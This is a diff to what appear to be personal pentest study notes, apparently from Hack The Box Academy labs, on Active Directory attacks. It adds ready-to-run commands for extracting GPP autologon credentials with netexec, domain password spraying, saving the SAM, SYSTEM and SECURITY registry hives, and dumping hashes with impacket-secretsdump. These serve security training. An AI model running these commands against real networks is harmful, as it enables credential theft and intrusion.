@@ -85,6 +85,11 @@ Try to do some Kerberoasting
 
    https://github.com/Andre92Marcos/escalations/blob/master/ad_attacks_enum/kerberoasting.md
 
+Try to look for Group Policy Preferences (GPP) store plaintext or AES-encrypted credentials for AutoLogon in Active Directory environments:
+
+```shell
+netexec smb 172.16.8.3 -u ssmalls -p Str0ngpass86! -M gpp_autologin
+```
 
 
 ## When we have a domain username, but no password, but we have a shell
@@ -105,14 +110,21 @@ Use the snaffler tool
 
    https://github.com/Andre92Marcos/tools/tree/master/snaffler
 
+Use laZagne tool
+
+   https://github.com/AndreMIsidoro/tools/tree/master/laZagne
+
 Use bloodhound
 
    https://github.com/Andre92Marcos/tools/tree/master/bloodhound
 
+Try some simple password spraying:
 
-If our user have some special permissions run secretdump
-
-   https://github.com/Andre92Marcos/tools/blob/master/impacket/secretdump.md
+https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1
+```shell
+#PowerView
+Invoke-DomainPasswordSpray -Password Welcome1
+```
 
 If we are not finding anythin with bloodhound
 
@@ -157,6 +169,21 @@ netexec smb 10.129.202.137 --local-auth -u bob -p 'HTB_@cademy_stdnt!' --lsa
 
 Dump lsass secrets with mimikatz
 
+
+Dump SAM database as with a System user:
+
+```
+reg save HKLM\SYSTEM SYSTEM.SAVE
+reg save HKLM\SECURITY SECURITY.SAVE
+reg save HKLM\SAM SAM.SAVE
+```
+Then upload the files to your host and use secretdumps on the files:
+
+```shell
+impacket-secretsdump LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE
+```
+
+It's also worth running Inveigh once we have local admin on a host to see if we can obtain password hashes for any users.
 
 
 ## Other Tips
